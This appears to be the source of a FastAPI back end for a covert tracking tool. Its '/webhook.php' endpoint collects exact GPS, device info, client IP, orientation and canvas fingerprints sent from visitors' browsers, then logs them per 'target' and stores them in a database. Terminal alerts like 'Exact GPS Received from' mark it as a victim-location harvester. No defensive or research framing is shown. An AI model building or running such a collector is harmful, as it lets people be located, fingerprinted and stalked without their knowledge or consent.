import sys
from fastapi import APIRouter, Request
import time
import uuid
import json
from datetime import datetime
from app.database import SessionLocal, CollectedData
from app.utils import log_to_file_rotating, save_orientation_json, format_human_readable, save_user_profile

router = APIRouter()

user_data_cache = {}
user_last_save = {}
user_last_orientation_log = {}
CACHE_TTL = 3600

def clean_old_cache():
    now = time.time()
    for uid in list(user_data_cache.keys()):
        if now - user_last_save.get(uid, 0) > CACHE_TTL:
            del user_data_cache[uid]
            del user_last_save[uid]
        if now - user_last_orientation_log.get(uid, 0) > CACHE_TTL:
            del user_last_orientation_log[uid]

@router.post("/webhook.php")
async def webhook_handler(request: Request):
    body = await request.body()
    if not body:
        return {"status": "empty"}
    
    try:
        raw_data = json.loads(body)
    except Exception:
        return {"status": "json_error"}
    
    user_id = raw_data.get("userId") or f"usr_{int(time.time())}_{uuid.uuid4().hex[:6]}"
    user_id = user_id.replace(" ", "_").replace(".", "_")[:50]
    
    current_time = time.time()
    clean_old_cache()

    # ১. সেন্সর হ্যান্ডলিং (৩ডি ভিউয়ার সুপারফাস্ট থাকবে, কিন্তু লগিং হবে ৩ সেকেন্ড পর পর)
    if "orientation" in raw_data and raw_data["orientation"]:
        o_dict = raw_data["orientation"]
        
        # (ক) ৩ডি ভিউয়ারের জন্য ফাস্ট ইন-মেমোরি আপডেট (কোনো ল্যাগ থাকবে না)
        save_orientation_json(o_dict)
        
        # (খ) ফাইলে স্প্যামিং রোধ: প্রতি ৩ সেকেন্ডে মাত্র একবার orientation.log-এ সেভ হবে
        if current_time - user_last_orientation_log.get(user_id, 0) >= 3.0:
            ts = o_dict.get('timestamp', datetime.now().isoformat())
            log_to_file_rotating("orientation.log", f"[{ts}] [{user_id}] Alpha: {o_dict.get('alpha', 0)} Beta: {o_dict.get('beta', 0)} Gamma: {o_dict.get('gamma', 0)}")
            user_last_orientation_log[user_id] = current_time

        # যদি শুধুই সেন্সর প্যাকেট হয়, তবে টার্মিনাল সম্পূর্ণ শান্ত রেখে ব্যাকগ্রাউন্ডে রেসপন্স করবে
        if "deviceInfo" not in raw_data and "gps" not in raw_data:
            return {"status": "sensor_live"}

    # ২. ক্লায়েন্ট আইপি সনাক্তকরণ
    client_ip = request.headers.get("cf-connecting-ip") or request.headers.get("x-forwarded-for") or (request.client.host if request.client else "127.0.0.1")
    if "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    if not raw_data.get("ipInfo"):
        raw_data["ipInfo"] = {"ip": client_ip}
    elif isinstance(raw_data["ipInfo"], dict) and not raw_data["ipInfo"].get("ip"):
        raw_data["ipInfo"]["ip"] = client_ip

    # ৩. মূল ক্যাশে আপডেট
    if user_id not in user_data_cache:
        user_data_cache[user_id] = {}
        user_last_save[user_id] = 0
    
    for key, value in raw_data.items():
        if key not in ["userId", "timestamp"]:
            user_data_cache[user_id][key] = value

    # ৪. গুরুত্বপূর্ণ টেলিমেট্রি সেভ ও টার্মিনাল অ্যালার্ট (শুধুমাত্র নতুন সেশন বা জিপিএস আসলে)
    should_save = False
    if "gps" in raw_data:
        should_save = True
    elif user_last_save.get(user_id, 0) == 0 and user_data_cache.get(user_id, {}).get("deviceInfo"):
        should_save = True
    elif current_time - user_last_save.get(user_id, 0) >= 4.0 and user_data_cache.get(user_id, {}).get("deviceInfo"):
        should_save = True

    if should_save and user_data_cache.get(user_id):
        full_data = user_data_cache[user_id].copy()
        full_data["userId"] = user_id
        full_data["timestamp"] = raw_data.get("timestamp") or datetime.now().isoformat()
        
        formatted_text = format_human_readable(full_data, user_id)
        
        # ফাইলে সংরক্ষণ
        log_to_file_rotating("data.txt", formatted_text)
        save_user_profile(user_id, formatted_text, full_data)
        
        user_last_save[user_id] = current_time
        
        # টার্মিনালে পরিচ্ছন্ন নোটিফিকেশন (শুধুমাত্র কাজের সময় প্রিন্ট হবে)
        if "gps" in raw_data:
            print(f"\n\033[1;32m[+] 🎯 Exact GPS Received from: {user_id}\033[0m", flush=True)
        else:
            print(f"\n\033[1;32m[+] 📱 Full Telemetry Profile Saved: {user_id}\033[0m", flush=True)
            print(f"\033[1;34m[+] 📁 Log: logs/targets/{user_id}.txt\033[0m\n", flush=True)
        sys.stdout.flush()
        
        # SQLite ডাটাবেস
        try:
            db = SessionLocal()
            db.add(CollectedData(
                id=str(uuid.uuid4()),
                user_id=user_id,
                device_info=full_data.get("deviceInfo"),
                gps_data=full_data.get("gps"),
                ip_info=full_data.get("ipInfo"),
                orientation=full_data.get("orientation"),
                canvas_fingerprint=full_data.get("canvasFingerprint")
            ))
            db.commit()
            db.close()
        except Exception:
            pass

    return {"status": "success", "userId": user_id}